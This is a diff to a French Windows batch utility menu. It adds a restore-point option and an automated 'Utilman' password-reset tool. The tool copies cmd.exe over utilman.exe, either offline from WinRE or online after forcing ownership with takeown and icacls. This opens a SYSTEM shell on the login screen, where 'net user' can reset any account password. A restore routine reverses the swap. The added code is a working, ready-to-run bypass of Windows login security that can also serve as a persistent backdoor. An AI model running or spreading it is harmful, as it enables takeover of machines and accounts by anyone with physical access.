@@ -956,6 +956,8 @@ echo  [26] Recherche FTP (Index Of / Google Dorks)
 echo.
 echo      === MOT DE PASSE ===
 echo  [17] Gestion des mots de passe Wi-Fi
+echo  [27] Creer un point de restauration (Sauvegarde)
+echo  [28] Reinitialiser MDP Session (Tutoriel Utilman)
 echo.
 echo      === MATERIEL ===
 echo  [18] Gestion de l'ecran tactile
@@ -997,6 +999,8 @@ if "%sys_choice%"=="23" goto sys_ping_test
 if "%sys_choice%"=="24" goto context_menu
 if "%sys_choice%"=="25" goto shortcuts_manager
 if "%sys_choice%"=="26" goto ftp_search
+if "%sys_choice%"=="27" goto create_restore_point
+if "%sys_choice%"=="28" goto utilman_guide
 if "%sys_choice%"=="0" goto menu_principal
 echo Choix invalide.
 pause
@@ -1657,6 +1661,202 @@ goto menu_wifi
 if exist "%MAPFILE%" del "%MAPFILE%" >nul 2>&1
 endlocal
 goto system_tools
+
+:create_restore_point
+cls
+color 0B
+echo ======================================================
+echo    CREATION POINT DE RESTAURATION
+echo ======================================================
+echo.
+echo Voulez-vous creer un point de restauration maintenant ?
+echo Cela est recommande AVANT toute modification systeme.
+echo.
+set /p confirm=Confirmer la creation ? (O/N) : 
+if /i not "%confirm%"=="O" goto system_tools
+
+echo.
+echo Creation du point de restauration en cours...
+echo Veuillez patienter (cela peut prendre quelques secondes)...
+echo.
+powershell -Command "Checkpoint-Computer -Description 'Sauvegarde Script AleexLeDev' -RestorePointType 'MODIFY_SETTINGS'"
+if %errorlevel% neq 0 (
+    echo.
+    echo [ERREUR] Impossible de creer le point de restauration.
+    echo Verifiez que la protection systeme est activee sur le disque C:
+) else (
+    echo.
+    echo [SUCCES] Point de restauration cree avec succes !
+)
+pause
+goto system_tools
+
+:utilman_guide
+cls
+color 0C
+echo ======================================================
+echo    REINITIALISATION MDP - UTILMAN (AUTOMATIQUE)
+echo ======================================================
+echo.
+echo  Cet outil remplace utilman.exe par cmd.exe pour
+echo  permettre la reinitialisation du mot de passe.
+echo.
+echo  MODES D'UTILISATION :
+echo  ---------------------
+echo  [1] Mode MANUEL (Lire le tutoriel texte)
+echo  [2] Mode AUTO - OFFLINE (Recommande - Depuis WinRE/USB)
+echo  [3] Mode AUTO - ONLINE (Force permissions - Risque)
+echo  [4] RESTAURER Utilman d'origine (Annuler le hack)
+echo.
+echo  [0] Retour
+echo.
+set /p util_choice=Votre choix: 
+
+if "%util_choice%"=="1" goto utilman_text
+if "%util_choice%"=="2" goto utilman_auto_offline
+if "%util_choice%"=="3" goto utilman_auto_online
+if "%util_choice%"=="4" goto utilman_restore
+if "%util_choice%"=="0" goto system_tools
+goto utilman_guide
+
+:utilman_text
+cls
+echo ======================================================
+echo    TUTORIEL MANUEL (Lecture seule)
+echo ======================================================
+echo.
+echo 1) Demarrer sur une cle USB Windows ou WinRE.
+echo 2) Ouvrir l'invite de commande (Shift + F10).
+echo 3) Identifier le disque Windows (ex: Z:).
+echo 4) Commandes a taper :
+echo    copy Z:\Windows\System32\utilman.exe Z:\Windows\System32\utilman.exe.bak
+echo    copy Z:\Windows\System32\cmd.exe Z:\Windows\System32\utilman.exe
+echo 5) Redemarrer et cliquer sur l'icone Ergonomie.
+echo 6) Taper : net user pseudo nouveau_mdp
+echo.
+pause
+goto utilman_guide
+
+:utilman_auto_offline
+cls
+echo.
+echo  MODE AUTOMATIQUE OFFLINE
+echo  ------------------------
+echo  A utiliser si vous avez demarre sur une cle USB ou WinRE.
+echo.
+echo  Entrez la lettre du lecteur qui contient Windows
+echo  (Attention : En WinRE, C: n'est pas toujours Windows !)
+echo.
+set /p target_dir=Lettre du lecteur (ex: C, D, E) : 
+if "%target_dir%"=="" goto utilman_guide
+set "sys32=%target_dir%:\Windows\System32"
+
+if not exist "%sys32%\utilman.exe" (
+    echo.
+    echo [ERREUR] utilman.exe introuvable sur %target_dir%:
+    echo Verifiez la lettre du lecteur (essayez D ou E).
+    pause
+    goto utilman_auto_offline
+)
+
+echo.
+echo 1. Sauvegarde de utilman.exe...
+copy /y "%sys32%\utilman.exe" "%sys32%\utilman.exe.bak"
+if errorlevel 1 (
+    echo [ERREUR] Echec de la sauvegarde.
+    pause
+    goto utilman_guide
+)
+
+echo 2. Remplacement par cmd.exe...
+copy /y "%sys32%\cmd.exe" "%sys32%\utilman.exe"
+if errorlevel 1 (
+    echo [ERREUR] Echec du remplacement.
+    pause
+    goto utilman_guide
+)
+
+echo.
+echo [SUCCES] Hack applique ! Redemarrez et cliquez sur l'icone Ergonomie.
+pause
+goto utilman_guide
+
+:utilman_auto_online
+cls
+echo.
+echo  MODE AUTOMATIQUE ONLINE (FORCE)
+echo  -------------------------------
+echo  Cette methode tente de modifier les fichiers pendant que
+echo  Windows est allume. Cela necessite de changer les droits.
+echo.
+echo  ATTENTION : Windows Defender peut bloquer/restaurer le fichier.
+echo.
+set /p confirm=Voulez-vous continuer ? (O/N) : 
+if /i not "%confirm%"=="O" goto utilman_guide
+
+echo.
+echo Creation automatique d'un point de restauration...
+powershell -Command "Checkpoint-Computer -Description 'Sauvegarde Avant Hack Utilman' -RestorePointType 'MODIFY_SETTINGS'"
+if %errorlevel% neq 0 (
+    echo.
+    echo [ATTENTION] Impossible de creer le point de restauration.
+    echo Voulez-vous quand meme continuer ? (O/N)
+    set /p ignore_restore=
+    if /i not "!ignore_restore!"=="O" goto utilman_guide
+) else (
+    echo [OK] Point de restauration cree.
+)
+echo.
+
+set "sys32=%SystemRoot%\System32"
+
+echo.
+echo 1. Prise de possession de utilman.exe...
+takeown /f "%sys32%\utilman.exe"
+icacls "%sys32%\utilman.exe" /grant Administrators:F
+
+echo.
+echo 2. Sauvegarde et Remplacement...
+copy /y "%sys32%\utilman.exe" "%sys32%\utilman.exe.bak"
+copy /y "%sys32%\cmd.exe" "%sys32%\utilman.exe"
+
+echo.
+echo Operation terminee. Verifiez les messages d'erreur ci-dessus.
+pause
+goto utilman_guide
+
+:utilman_restore
+cls
+echo.
+echo  RESTAURATION ORIGINALE
+echo  ----------------------
+echo.
+set /p target_dir=Lettre du lecteur (Laisser vide pour %SystemDrive:~0,1%) : 
+if "%target_dir%"=="" set "target_dir=%SystemDrive:~0,1%"
+set "sys32=%target_dir%:\Windows\System32"
+
+if not exist "%sys32%\utilman.exe.bak" (
+    echo.
+    echo [ERREUR] Sauvegarde .bak introuvable sur %target_dir%:
+    pause
+    goto utilman_guide
+)
+
+echo.
+echo Restauration en cours...
+copy /y "%sys32%\utilman.exe.bak" "%sys32%\utilman.exe"
+if errorlevel 1 (
+    echo.
+    echo [ACCES REFUSE] Tentative de forcer les droits...
+    takeown /f "%sys32%\utilman.exe"
+    icacls "%sys32%\utilman.exe" /grant Administrators:F
+    copy /y "%sys32%\utilman.exe.bak" "%sys32%\utilman.exe"
+)
+
+echo.
+echo Restauration terminee.
+pause
+goto utilman_guide
 
 :sys_battery_report
 cls
